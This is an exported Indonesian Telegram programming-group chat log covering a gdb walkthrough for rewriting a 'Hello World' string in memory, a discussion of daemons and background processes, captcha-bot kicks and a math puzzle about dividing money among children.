+1497,0,"Di sini saya mau mencoba untuk mengubah ""Hello World!"" menjadi ""ABCDEFGHIJK"".",8,12,2019,14,39,32,Ammar Faizi,,0,ammarfaizi2
+1498,0,"Pertama-tama kita harus tau dulu representasi ""ABCDEFGHIJK"" di memory itu seperti apa.",8,12,2019,14,39,46,Ammar Faizi,,0,ammarfaizi2
+1499,0,Bisa pakai PHP seperti ini.,8,12,2019,14,40,15,Ammar Faizi,,0,ammarfaizi2
+1500,0,strrev (untuk membalik string). Karena x64 itu little endian jadi harus dibalik dulu.\n\nbin2hex (untuk mengubah string jadi hex).,8,12,2019,14,40,46,Ammar Faizi,,0,ammarfaizi2
+1501,0,Di sini arsitektur yang saya pakai x64.,8,12,2019,14,41,19,Ammar Faizi,,0,ammarfaizi2
+1502,0,x64 ini arsitektur 64 bit.,8,12,2019,14,41,33,Ammar Faizi,,0,ammarfaizi2
+1503,0,Jadi dalam satu instruction dia bisa melakukan read/write sebesar 64 bit atau 8 bytes.,8,12,2019,14,42,5,Ammar Faizi,,0,ammarfaizi2
+1504,0,Jadi kita ambil 8 bytes dari kanan dulu.,8,12,2019,14,42,16,Ammar Faizi,,0,ammarfaizi2
+1505,0,Jadinya yang akan kita masukkan pertama kali adalah `4847464544434241`.,8,12,2019,14,42,39,Ammar Faizi,,0,ammarfaizi2
+1506,0,Jangan lupa tambahkan `0x` ketika masuk ke gdb.,8,12,2019,14,42,51,Ammar Faizi,,0,ammarfaizi2
+1507,0,Jadi `0x4847464544434241`.,8,12,2019,14,42,56,Ammar Faizi,,0,ammarfaizi2
+1508,0,Setelah itu kita lakukan pointerisasi ke address stack tadi dengan tipe data long long (ukuran 64 bit atau 8 bytes) dan ubah isinya dengan nilai hex tadi.,8,12,2019,14,43,42,Ammar Faizi,,0,ammarfaizi2
+1509,0,`p *((long long *)0x00007fffffffe38b) = 0x4847464544434241`,8,12,2019,14,44,0,Ammar Faizi,,0,ammarfaizi2
+1510,0,Setelah itu kita cek lagi di hexdump.,8,12,2019,14,44,13,Ammar Faizi,,0,ammarfaizi2
+1511,0,Hasilnya jadi seperti ini.,8,12,2019,14,44,35,Ammar Faizi,,0,ammarfaizi2
+1512,0,"Sekarang sisanya adalah mengubah ""`rld`"" jadi ""`IJK`""",8,12,2019,14,45,11,Ammar Faizi,,0,ammarfaizi2
+1513,0,Pinned mas nnti saya baca,8,12,2019,14,45,21,Shinji,Ikari,0,gh0zialfat1h
+1514,0,Saya sendiri basicnya seorang backend developer,8,12,2019,14,45,34,Shinji,Ikari,0,gh0zialfat1h
+1515,0,"Saya sebenernya juga backend developer sih (backend web PHP). Tapi beberapa tahun ini kerjaannya masuk ke core interpreter PHP-nya, jadi ngerti Assembly juga sekarang.",8,12,2019,14,47,33,Ammar Faizi,,0,ammarfaizi2
+1516,0,"Untuk ngubah ""rld"" jadi ""IJK"" berarti kita perlu nambahkan offset pointernya + 8.",8,12,2019,14,48,41,Ammar Faizi,,0,ammarfaizi2
+1517,0,Jadinya seperti ini.,8,12,2019,14,48,49,Ammar Faizi,,0,ammarfaizi2
+1518,0,Setelah itu next sampai syscall writenya dipanggil.,8,12,2019,14,49,19,Ammar Faizi,,0,ammarfaizi2
+1519,0,"Ketika sampai ke write yang ditampilkan sudah bukan ""Hello World"" lagi, tapi ""ABCDEFGHIJK"".",8,12,2019,14,50,8,Ammar Faizi,,0,ammarfaizi2
+1520,0,"Udah, selesai.",8,12,2019,14,51,10,Ammar Faizi,,0,ammarfaizi2
+1522,0,https://meet.jit.si/mignu\n\nKuliah suara sedang berlangsung bersama kang ade malsasa,8,12,2019,14,53,7,,,0,
+1523,0,Buka lewat web,8,12,2019,14,53,22,,,0,
+1524,1521,Pakai `ni` pak.,8,12,2019,14,54,12,Ammar Faizi,,0,ammarfaizi2
+1525,1521,`b *00100074 `\n`ni`,8,12,2019,14,54,32,Ammar Faizi,,0,ammarfaizi2
+1526,0,Pastikan pola penulisannya addressnya dalam bentuk apa dulu.,8,12,2019,14,54,47,Ammar Faizi,,0,ammarfaizi2
+1527,0,Kalau hexadecimal harus pakai 0x.,8,12,2019,14,54,56,Ammar Faizi,,0,ammarfaizi2
+1528,0,`b *0x00100074 \nni`,8,12,2019,14,55,1,Ammar Faizi,,0,ammarfaizi2
+1530,1529,Ya ketik `ni` lagi pak.,8,12,2019,14,58,29,Ammar Faizi,,0,ammarfaizi2
+1532,1531,"Itu sudah jalan pak, dari 10078 ke 1007c, pindah lagi ke 10080.",8,12,2019,14,59,24,Ammar Faizi,,0,ammarfaizi2
+1533,0,Coba dicek dulu posisinya sekarang dimana?,8,12,2019,14,59,30,Ammar Faizi,,0,ammarfaizi2
+1534,0,Ketik `layout asm` pak,8,12,2019,14,59,35,Ammar Faizi,,0,ammarfaizi2
+1536,0,"Iya, ukuran tiap instruction bisa beda-beda pak.",8,12,2019,15,2,23,Ammar Faizi,,0,ammarfaizi2
+1537,0,`bawah + 2` belum tentu instruksi berikutnya.,8,12,2019,15,2,36,Ammar Faizi,,0,ammarfaizi2
+1538,0,Mending pakai `ni`.,8,12,2019,15,2,43,Ammar Faizi,,0,ammarfaizi2
+1539,0,`ni` juga bisa langsung run lebih dari satu instruction.,8,12,2019,15,2,54,Ammar Faizi,,0,ammarfaizi2
+1540,0,Misal `ni 5`,8,12,2019,15,3,1,Ammar Faizi,,0,ammarfaizi2
+1541,0,Otomatis langsung lanjut 5 instruction.,8,12,2019,15,3,7,Ammar Faizi,,0,ammarfaizi2
+1543,0,Kill process exit gdb aja.,8,12,2019,15,4,24,Ammar Faizi,,0,ammarfaizi2
+1544,0,atau ketik `r` lagi (ngulang dari awal).,8,12,2019,15,4,28,Ammar Faizi,,0,ammarfaizi2
+1546,1545,Bisa pakai CTRL + C pak.,8,12,2019,15,8,42,Ammar Faizi,,0,ammarfaizi2
+1548,0,Otomatis gdb stop ke instruction terakhir yang dijalankan.,8,12,2019,15,8,52,Ammar Faizi,,0,ammarfaizi2
+1550,0,Bisa di lanjutin lagi habis CTRL + C,8,12,2019,15,9,7,Ammar Faizi,,0,ammarfaizi2
+1551,0,Kalau mau ngelanjutkan lagi ketik `c` (continue).,8,12,2019,15,10,21,Ammar Faizi,,0,ammarfaizi2
+1552,0,Kalau lanjutnya step by step pakai `ni`.,8,12,2019,15,10,32,Ammar Faizi,,0,ammarfaizi2
+1557,0,"Memang bisa sih, tapi aloc dan deallocnya harus pakai push pop.",8,12,2019,15,23,40,Ammar Faizi,,0,ammarfaizi2
+1558,0,Misal kalau kita alokasikan banyak size bisa substract register SP aja kan harusnya.,8,12,2019,15,23,59,Ammar Faizi,,0,ammarfaizi2
+1559,0,Selingan,8,12,2019,15,24,31,Ammar Faizi,,0,ammarfaizi2
+1560,0,"`sub rsp, 8 * 4`",8,12,2019,15,24,47,Ammar Faizi,,0,ammarfaizi2
+1562,0,It is called LIFO.,8,12,2019,15,32,46,Ammar Faizi,,0,ammarfaizi2
+1563,0,Last In First Out.,8,12,2019,15,32,51,Ammar Faizi,,0,ammarfaizi2
+1566,1565,Harusnya dikeluarkan dulu.,8,12,2019,15,44,46,Ammar Faizi,,0,ammarfaizi2
+1567,0,Tapi itu kena exit duluan.,8,12,2019,15,44,58,Ammar Faizi,,0,ammarfaizi2
+1568,0,Jadi nggak ngaruh apa-apa.,8,12,2019,15,45,5,Ammar Faizi,,0,ammarfaizi2
+1570,0,Iya dong.,8,12,2019,15,46,31,Ammar Faizi,,0,ammarfaizi2
+1571,0,Programnya juga berhenti.,8,12,2019,15,46,35,Ammar Faizi,,0,ammarfaizi2
+1572,0,Yang bahaya itu kalau return addressnya ketimpa.,8,12,2019,15,46,48,Ammar Faizi,,0,ammarfaizi2
+1573,0,Misal call function lain tapi stack nggak direstore ke semula.,8,12,2019,15,46,58,Ammar Faizi,,0,ammarfaizi2
+1574,0,Ketika return bisa segfault.,8,12,2019,15,47,6,Ammar Faizi,,0,ammarfaizi2
+1578,0,Itu shmop kayaknya pak.,8,12,2019,15,51,2,Ammar Faizi,,0,ammarfaizi2
+1579,0,`man 2 shmop`,8,12,2019,15,51,20,Ammar Faizi,,0,ammarfaizi2
+1580,0,Syscallnya namanya `shmat`.,8,12,2019,15,52,3,Ammar Faizi,,0,ammarfaizi2
+1584,0,"Nggak tau, kurang paham konsep TSR.",8,12,2019,15,59,7,Ammar Faizi,,0,ammarfaizi2
+1585,0,"Yang saya bahas tentang shmop itu ketika program exit, memory-nya masih ada dan bisa dipakai lagi selama belum didetach.",8,12,2019,15,59,47,Ammar Faizi,,0,ammarfaizi2
+1586,1581,nggak. PC direstart ya bye bye program mati. kudu dijalanin lagi,8,12,2019,16,2,58,Andre,,0,anta40
+1587,0,TSR itu konsepnya mirip daemon. Tapi bekerjanya di sistem operasi single task macam DOS.,8,12,2019,21,43,32,Zamrony P.,Juhara,0,zamronypj
+1597,1381,"Aku gak pernah mainan x86, apalagi nge-RE lho om 👀",9,12,2019,0,16,19,Moriah,Soewako,0,soewako
+1599,1595,Bisa. Daemon itu di linux cuma aplikasi biasa yang tidak ada shellnya. Google saja linux keylogger. Cuma implementasinya kebanyakan C. Kalau assembly gak tau,9,12,2019,0,27,17,Zamrony P.,Juhara,0,zamronypj
+1600,1599,Pake C ya. ok thx.,9,12,2019,0,30,50,Iwan,Aldiansyah,0,ThefoxAzubirs
+1601,0,Thanks ilmunya om @ammarfaizi2,9,12,2019,0,38,24,Shinji,Ikari,0,gh0zialfat1h
+1602,1595,"Ya kalau di *nix sih cukup jalanin aplikasinya pakai `&` aja gak sih, gak perlu pakai teknik ngoding aneh-aneh 🙈",9,12,2019,0,45,30,Moriah,Soewako,0,soewako
+1603,0,```$ ./programassembly &\n$ ./programc &\n$ python ./program.py &\n```\nDst.,9,12,2019,0,46,23,Moriah,Soewako,0,soewako
+1604,1602,Bener  banget kalo ngga remote kalo remote ente exit ya mati lagi eh,9,12,2019,0,46,53,koceng belang,,0,Arbaym
+1605,1604,`nohup` nobochorr,9,12,2019,0,47,15,Moriah,Soewako,0,soewako
+1606,0,Eh wait itu nodrop ya,9,12,2019,0,47,24,Moriah,Soewako,0,soewako
+1607,1605,Yup kalo remote ditambah nohup,9,12,2019,0,48,1,koceng belang,,0,Arbaym
+1611,1588,"Coba restart PC. Setau saya, Linux ga ada konsep TSR. Mentok2 ya dibuat scheduler pakai cron mungkin",9,12,2019,1,27,38,Andre,,0,anta40
+1614,1612,"OK saya ngga teliti baca. Ya memang tinggal tambahin ""&"" di akhir executable.",9,12,2019,2,0,27,Andre,,0,anta40
+1615,0,Tapi kalo login beda user gimana dong?,9,12,2019,2,4,42,Andre,,0,anta40
+1620,0,Linux OS yg multiuser sih.... beda ama DOS,9,12,2019,3,3,16,Andre,,0,anta40
+1628,1615,Jalanin pakai root?,9,12,2019,3,15,50,Moriah,Soewako,0,soewako
+1633,0,"Pak, tanya Pak",9,12,2019,3,28,18,Yovi,Prasetyo,0,yoviprasetyo
+1634,0,Apakah di sini ada yang pernah run macOS di Linux via qemu?,9,12,2019,3,28,38,Yovi,Prasetyo,0,yoviprasetyo
+1635,0,,9,12,2019,7,58,49,Alifia,Sarah,0,alifiasarah
+1636,0,,9,12,2019,9,34,24,,,0,
+1637,0,,10,12,2019,7,6,8,,,0,
+1639,0,[cindy ouza .](tg://user?id=814810648) has been kicked from the group due to failed to answer the captcha.,10,12,2019,7,11,15,Ice Tea,,0,MyIceTea_Bot
+1640,0,hallo,10,12,2019,7,13,47,,,0,
+1641,0,What,10,12,2019,7,14,11,⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠,GNU/std::sakty ( ✪ ),0,sunda005
+1642,0,,10,12,2019,9,17,36,Samuel,Nainggolan,0,Samueljo555
+1644,0,0,10,12,2019,9,19,25,Samuel,Nainggolan,0,Samueljo555
+1645,1644,Wrong answer!,10,12,2019,9,19,26,Ice Tea,,0,MyIceTea_Bot
+1646,0,1,10,12,2019,9,20,46,Samuel,Nainggolan,0,Samueljo555
+1647,1646,Wrong answer!,10,12,2019,9,20,47,Ice Tea,,0,MyIceTea_Bot
+1648,0,2,10,12,2019,9,20,50,Samuel,Nainggolan,0,Samueljo555
+1649,1648,Wrong answer!,10,12,2019,9,20,51,Ice Tea,,0,MyIceTea_Bot
+1650,0,0.6,10,12,2019,9,22,17,Samuel,Nainggolan,0,Samueljo555
+1651,1650,Wrong answer!,10,12,2019,9,22,19,Ice Tea,,0,MyIceTea_Bot
+1652,0,12,10,12,2019,9,22,22,Samuel,Nainggolan,0,Samueljo555
+1653,1652,Wrong answer!,10,12,2019,9,22,23,Ice Tea,,0,MyIceTea_Bot
+1654,0,[Samuel Nainggolan](tg://user?id=772046371) has been kicked from the group due to failed to answer the captcha.,10,12,2019,9,22,42,Ice Tea,,0,MyIceTea_Bot
+1655,0,,10,12,2019,9,28,58,Samuel,Nainggolan,0,Samueljo555
+1657,0,[Samuel Nainggolan](tg://user?id=772046371) has been kicked from the group due to failed to answer the captcha.,10,12,2019,9,34,5,Ice Tea,,0,MyIceTea_Bot
+1658,0,captchanya sadis euy. suruh ngerjain kalkulus kwkwkw,10,12,2019,10,42,38,Andre,,0,anta40
+1659,0,Ada screenshot nya gak pengen tau captcha nya kek gimana?,10,12,2019,11,28,39,Eka,Ramdhani,0,Ekahungkul
+1664,1659,Sama. penasaran wk,10,12,2019,15,2,5,∞[····–––···––··––],NF,0,Kakatuahitam
+1665,0,Ane pamit. Mohon maaf kalo ada salah2 kata ya...,10,12,2019,15,19,46,Iwan,Aldiansyah,0,ThefoxAzubirs
+1666,0,"Eyy... Jangan woi, seru diskusinya. Lanjutin",10,12,2019,15,41,56,ZakiNadhif,,0,zndf0
+1667,0,W disini nyimak btw,10,12,2019,15,42,5,ZakiNadhif,,0,zndf0
+1668,0,Wkwk,10,12,2019,15,42,54,ZakiNadhif,,0,zndf0
+1674,0,,11,12,2019,3,13,42,,,0,
+1676,0,[Adb Bagoes 1503](tg://user?id=783992320) (@Bagoes1503) has been kicked from the group due to failed to answer the captcha.,11,12,2019,3,19,46,Ice Tea,,0,MyIceTea_Bot
+1677,0,Wk. Limit dong. Yh diunsend ama botnya wk,11,12,2019,3,19,55,∞[····–––···––··––],NF,0,Kakatuahitam
+1678,0,Bayangkan captchanya,11,12,2019,4,10,5,ZakiNadhif,,0,zndf0
+1679,0,Itu dikick beneran?,11,12,2019,4,10,35,ZakiNadhif,,0,zndf0
+1680,0,,11,12,2019,7,58,37,Putri Suci,Lestari,0,Putrisucitanjung
+1682,0,3,11,12,2019,8,3,35,Putri Suci,Lestari,0,Putrisucitanjung
+1683,0,[Putri Suci Lestari](tg://user?id=854567900)\n**Please solve this captcha problem to make sure you are a human or you will be kicked in 5 minutes. Reply your answer to this message!**\n\nIntegrate the following expression!,11,12,2019,8,3,35,Putri Suci,Lestari,0,Putrisucitanjung
+1684,1682,Wrong answer!,11,12,2019,8,3,37,Ice Tea,,0,MyIceTea_Bot
+1685,1683,Wrong answer!,11,12,2019,8,3,37,Ice Tea,,0,MyIceTea_Bot
+1686,0,[Putri Suci Lestari](tg://user?id=854567900) has been kicked from the group due to failed to answer the captcha.,11,12,2019,8,3,44,Ice Tea,,0,MyIceTea_Bot
+1687,0,Eh mantap captcha nya kwkwk,11,12,2019,11,23,8,>> 𝗩𝗶𝗿,•,0,vir_sam
+1688,0,,11,12,2019,23,11,24,chainsaw,,0,g7le5
+1690,0,-7,11,12,2019,23,12,1,chainsaw,,0,g7le5
+1691,1690,[Shitong CHAI](tg://user?id=) has answered the captcha correctly. Welcome to the group!,11,12,2019,23,12,2,Ice Tea,,0,MyIceTea_Bot
+1692,0,Why are you so smart?,11,12,2019,23,12,20,ZakiNadhif,,0,zndf0
+1693,0,"Actually, mathematica can solve this XD",11,12,2019,23,13,34,chainsaw,,0,g7le5
+1694,1693,Do you think 9 grader can solve that?,11,12,2019,23,15,9,ZakiNadhif,,0,zndf0
+1695,0,Maybe not,11,12,2019,23,16,10,chainsaw,,0,g7le5
+1696,0,Yeah I can't,11,12,2019,23,16,45,ZakiNadhif,,0,zndf0
+1697,0,"Maybe yes, because the 9th grader has been taught  since 4th?",12,12,2019,1,43,25,∞[····–––···––··––],NF,0,Kakatuahitam
+1700,0,Mampos,12,12,2019,3,7,45,⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠,GNU/std::sakty ( ✪ ),0,sunda005
+1702,0,MAMPOS LU,12,12,2019,3,13,18,⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠,GNU/std::sakty ( ✪ ),0,sunda005
+1703,0,Saya boleh jawab nggak,12,12,2019,3,14,44,Eka,Ramdhani,0,Ekahungkul
+1704,1697,I'm not Einstein,12,12,2019,3,49,12,ZakiNadhif,,0,zndf0
+1711,0,,14,12,2019,12,37,16,⁠,,0,MuhShalah007
+1713,0,,14,12,2019,12,40,0,⁠,,0,MuhShalah007
+1714,1712,7,14,12,2019,12,40,4,⁠,,0,MuhShalah007
+1716,1714,[Muh Shalah (#²⁰²⁰)‌‌™‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌ ‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌](tg://user?id=) (@MuhShalah007) has answered the captcha correctly. Welcome to the group!,14,12,2019,12,40,5,Ice Tea,,0,MyIceTea_Bot
+1717,0,ok thanks,14,12,2019,12,40,17,⁠,,0,MuhShalah007
+1718,1717,Wrong answer!,14,12,2019,12,40,18,Ice Tea,,0,MyIceTea_Bot
+1719,1715,144,14,12,2019,12,43,3,⁠,,0,MuhShalah007
+1720,1719,[Muh Shalah (#²⁰²⁰)‌‌™‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌ ‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌‎‌‌‎‌‌‌](tg://user?id=) (@MuhShalah007) has answered the captcha correctly. Welcome to the group!,14,12,2019,12,43,4,Ice Tea,,0,MyIceTea_Bot
+1721,1719,Curang,14,12,2019,12,43,29,⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠,GNU/std::sakty ( ✪ ),0,sunda005
+1723,1722,Pakek converter kan,14,12,2019,12,43,46,⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠,GNU/std::sakty ( ✪ ),0,sunda005
+1725,1724,Coba poto bekas ngitungnya,14,12,2019,12,44,17,⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠,GNU/std::sakty ( ✪ ),0,sunda005
+1726,0,,15,12,2019,3,38,16,Iwan,Aldiansyah,0,ThefoxAzubirs
+1728,0,0,15,12,2019,3,38,30,Iwan,Aldiansyah,0,ThefoxAzubirs
+1729,1728,Wrong answer!,15,12,2019,3,38,31,Ice Tea,,0,MyIceTea_Bot
+1730,0,1,15,12,2019,3,38,33,Iwan,Aldiansyah,0,ThefoxAzubirs
+1731,1730,[thefox azubirs](tg://user?id=) (@TheFoxAzubirs) has answered the captcha correctly. Welcome to the group!,15,12,2019,3,38,35,Ice Tea,,0,MyIceTea_Bot
+1732,0,"0! itu 1 ya? kirain 0, lupa euy....kelamaan ga maen mtk....😅",15,12,2019,3,40,6,Iwan,Aldiansyah,0,ThefoxAzubirs
+1733,0,padahal udah nyiapin jawaban yg aneh2 biar ga mencet2 kalkulator....😂....,15,12,2019,3,44,23,Iwan,Aldiansyah,0,ThefoxAzubirs
+1734,0,/cyf4 \int \int \int x^4 y^4 z^4 dx dy dz,15,12,2019,4,42,31,Iwan,Aldiansyah,0,ThefoxAzubirs
+1735,1734,```plot [//math:\int \int \int x^4 y^4 z^4 dx dy dz//]```,15,12,2019,4,42,32,Ice Tea,,0,MyIceTea_Bot
+1736,0,oh jalan juga di sini ya..,15,12,2019,4,42,45,Iwan,Aldiansyah,0,ThefoxAzubirs
+1737,1222,Owalah iso ngomong jowo,15,12,2019,5,36,32,,,0,
+1739,1737,pemrograman java kali....😂,15,12,2019,7,55,6,Iwan,Aldiansyah,0,ThefoxAzubirs
+1740,0,/c002 \int \int \int x^4 y^4 z^4 dx dy dz,15,12,2019,9,35,18,Iwan,Aldiansyah,0,ThefoxAzubirs
+1741,1739,Bahasa kopi eh,15,12,2019,9,36,2,koceng belang,,0,Arbaym
+1742,1740,```\int \int \int x^{4}y^{4}z^{4}dxdydz=Cz+\frac{y^{5}x^{5}z^{5}}{125}+Cyz+C```,15,12,2019,9,36,4,Ice Tea,,0,MyIceTea_Bot
+1743,0,/cyf4 (y^5 x^5 z^5)/125,15,12,2019,9,37,32,Iwan,Aldiansyah,0,ThefoxAzubirs
+1744,1743,Calculating...,15,12,2019,9,37,33,Ice Tea,,0,MyIceTea_Bot
+1745,1743,```plot [//math:(y^5 x^5 z^5)/125//]```,15,12,2019,9,37,51,Ice Tea,,0,MyIceTea_Bot
+1746,0,/cyf4 \int \int \int xyz dx dy dz,15,12,2019,9,41,16,Iwan,Aldiansyah,0,ThefoxAzubirs
+1747,1746,```plot [//math:\int \int \int xyz dx dy dz//]```,15,12,2019,9,41,17,Ice Tea,,0,MyIceTea_Bot
+1748,0,/cyf4 \int \int \int 1/(xyz)  dx dy dz,15,12,2019,9,41,52,Iwan,Aldiansyah,0,ThefoxAzubirs
+1749,1748,Calculating...,15,12,2019,9,41,54,Ice Tea,,0,MyIceTea_Bot
+1750,0,/cyf4 \int \int \int p^2 + q^2 + r^2 dp dq dr,15,12,2019,9,44,56,Iwan,Aldiansyah,0,ThefoxAzubirs
+1751,1750,Invalid data!,15,12,2019,9,44,58,Ice Tea,,0,MyIceTea_Bot
+1752,0,/cyf4 \int \int \int x^2 + y^2 + z^2 dx dy dz,15,12,2019,9,45,40,Iwan,Aldiansyah,0,ThefoxAzubirs
+1753,1752,Invalid data!,15,12,2019,9,45,41,Ice Tea,,0,MyIceTea_Bot
+1754,0,/cyf4 \int \int \int 1/(xyz)  dx dy dz,15,12,2019,9,47,26,Iwan,Aldiansyah,0,ThefoxAzubirs
+1755,0,/cyf4 \int \int \int (1/x) (1/y) (1/z) dx dy dz,15,12,2019,9,48,18,Iwan,Aldiansyah,0,ThefoxAzubirs
+1756,1755,Calculating...,15,12,2019,9,48,20,Ice Tea,,0,MyIceTea_Bot
+1757,1755,```plot [//math:\int \int \int (1/x) (1/y) (1/z) dx dy dz//]```,15,12,2019,9,48,51,Ice Tea,,0,MyIceTea_Bot
+1758,0,,16,12,2019,0,13,23,,,0,
+1760,0,Wait🙏,16,12,2019,0,14,19,,,0,
+1761,1760,Wrong answer!,16,12,2019,0,14,20,Ice Tea,,0,MyIceTea_Bot
+1762,0,10 x,16,12,2019,0,16,15,,,0,
+1763,1762,Wrong answer!,16,12,2019,0,16,17,Ice Tea,,0,MyIceTea_Bot
+1764,0,[Cio](tg://user?id=895490658) has been kicked from the group due to failed to answer the captcha.,16,12,2019,0,18,32,Ice Tea,,0,MyIceTea_Bot
+1765,1760,Wk,16,12,2019,0,22,3,∞[····–––···––··––],NF,0,Kakatuahitam
+1766,0,,16,12,2019,0,24,48,,,0,
+1768,1763,12,16,12,2019,0,25,10,,,0,
+1769,1768,Wrong answer!,16,12,2019,0,25,11,Ice Tea,,0,MyIceTea_Bot
+1774,1767,Kali ini ez ternyata,16,12,2019,0,28,34,∞[····–––···––··––],NF,0,Kakatuahitam
+1775,0,kok? perasaan tadi udah ada orang yg kasih jawaban benernya....mana tadi ya>,16,12,2019,0,29,47,Iwan,Aldiansyah,0,ThefoxAzubirs
+1776,0,[Cio](tg://user?id=895490658) has been kicked from the group due to failed to answer the captcha.,16,12,2019,0,29,55,Ice Tea,,0,MyIceTea_Bot
+1777,0,,16,12,2019,0,30,43,∞[····–––···––··––],NF,0,Kakatuahitam
+1778,1777,@TheFoxAzubirs,16,12,2019,0,30,55,∞[····–––···––··––],NF,0,Kakatuahitam
+1779,0,Sengaja biar yg ditest g curang wk,16,12,2019,0,31,13,∞[····–––···––··––],NF,0,Kakatuahitam
+1780,1779,sengaja apanya?,16,12,2019,0,32,11,Iwan,Aldiansyah,0,ThefoxAzubirs
+1781,1777,Sy unsend jawaban 4nya,16,12,2019,0,32,23,∞[····–––···––··––],NF,0,Kakatuahitam
+1782,0,pantesan....,16,12,2019,0,32,53,Iwan,Aldiansyah,0,ThefoxAzubirs
+1783,0,hehe....kirain dejavu...,16,12,2019,0,33,35,Iwan,Aldiansyah,0,ThefoxAzubirs
+1784,0,,16,12,2019,0,34,46,Iwan,Aldiansyah,0,ThefoxAzubirs
+1785,0,,16,12,2019,1,54,50,Bahyu,Sanciko,0,Bahyusanciko
+1787,0,[Bahyu Sanciko](tg://user?id=313186132) (@Bahyusanciko) has been kicked from the group due to failed to answer the captcha.,16,12,2019,1,59,57,Ice Tea,,0,MyIceTea_Bot
+1788,1739,Boso jowo,16,12,2019,2,0,1,Gandi,S,0,setsuga
+1789,0,Yuk kita main teka teki matematika\n\nPak Amir memiliki uang 13 juta yang akan dibagikan kepada anak2nya dgn aturan:\nsulung mendapat 1/2 bagian\nanak kedua mendapat 1/3 bagian\nbungsu mendapat 1/4 bagian.\n\nKemudian pak Amir menyamakan penyebut menjadi 12. Maka\nsulung \n1/2 = 6/12  pembilang 6\nanak kedua \n1/3 = 4/12 pembilang 4\nbungsu\n1/4=3/12 pembilang 3\n\nsehingga dengan melihat pembilang didapat\nsulung =6 juta\nanak kedua=4 juta\nbungsu=3 juta\n\nTapi seseorang melihat metode pembagian uang tersebut dan menyatakan bahwa metode pembagian uangnya salah.\n\nPertanyaannya:\nDapatkah kalian menunjukkan di mana letak kesalahan metodenya?,16,12,2019,12,25,17,Iwan,Aldiansyah,0,ThefoxAzubirs
+1790,1789,belajar manual debugging kita...😬,16,12,2019,12,31,41,Iwan,Aldiansyah,0,ThefoxAzubirs
+1791,0,13/12 hm,16,12,2019,13,32,6,∞[····–––···––··––],NF,0,Kakatuahitam
+1792,0,Penyebut harusny tetep 13?,16,12,2019,13,32,48,∞[····–––···––··––],NF,0,Kakatuahitam
+1793,0,Bagian yg ditentuin juga melebihi rasio 1:1. Jdinya kyk 13/12. Full 13 juta tapi ad lebihnya. Nyatanya kan uang cuma 13 jt,16,12,2019,13,34,28,∞[····–––···––··––],NF,0,Kakatuahitam
+1794,0,Anak sulung: 6/12 * 13 = 6.5......,16,12,2019,13,36,26,Andre,,0,anta40
+1795,0,,16,12,2019,13,41,53,Iwan,Aldiansyah,0,ThefoxAzubirs
+1796,0,ga tau itu namanya apa. Itu seperti metodologi waris dalam islam.\n\nmisal:\nanak laki2 dapat 1\nanak perempuan dapat 1/2\nkalo anaknya ada 2laki dan 3perempuan maka \n1+1+1/2+1/2+1/2\ntotalnya 3 setengah x\nlaki pertama dapat 1/(7/2)x=2x/7\nlaki kedua sama 2x/7\ncewek1 dapat (1/2)/(7/2)=(1/7)x\ncewek2 juga (1/7)x\ncewek3 juga (1/7)x,16,12,2019,13,42,1,Iwan,Aldiansyah,0,ThefoxAzubirs
+1797,0,"jadi waris di islam itu dihitung dulu berapa orang yg berhak atas waris, kenudian dihithung warisnya menurut aturan islam (ada aturan hak warisnya). nanti totalnya itulah yg harus 100%\nbaru kemudian dibagi berdasarkan hak nya",16,12,2019,13,42,27,Iwan,Aldiansyah,0,ThefoxAzubirs
+1798,1795,"Buknnya 13/12 itu 1.083, artinya 108,3% an",16,12,2019,13,52,21,∞[····–––···––··––],NF,0,Kakatuahitam
